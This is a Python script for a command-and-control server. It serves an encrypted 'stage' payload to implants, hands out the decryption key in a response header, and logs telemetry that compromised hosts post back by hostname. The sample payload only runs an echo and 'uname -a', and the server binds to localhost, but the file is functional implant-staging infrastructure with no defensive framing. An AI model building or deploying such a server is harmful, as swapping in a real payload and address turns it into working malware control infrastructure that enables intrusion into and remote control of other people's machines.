import os
import json
import base64
from http.server import HTTPServer, BaseHTTPRequestHandler
from cryptography.fernet import Fernet

KEY = Fernet.generate_key()
cipher = Fernet(KEY)

RAW_PAYLOAD = b"echo '[+] Implant successfully executed in memory!' && uname -a"
ENCRYPTED_PAYLOAD = cipher.encrypt(RAW_PAYLOAD)

class C2ControllerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/fetch-stage":
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("X-Session-Key", base64.b64encode(KEY).decode())
            self.end_headers()
            self.wfile.write(ENCRYPTED_PAYLOAD)
            print(f"[+] Served encrypted payload to {self.client_address[0]}")
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == "/telemetry":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            telemetry = json.loads(post_data.decode())
            
            os.makedirs("logs", exist_ok=True)
            with open("logs/incoming_telemetry.json", "a") as log_file:
                json.dump(telemetry, log_file)
                log_file.write("\n")
                
            self.send_response(200)
            self.end_headers()
            print(f"[+] Received execution telemetry from client: {telemetry.get('hostname')}")

def run_server(port=8080):
    print(f"[*] C2 Controller listening on port {port}...")
    server_address = ('127.0.0.1', port)
    httpd = HTTPServer(server_address, C2ControllerHandler)
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()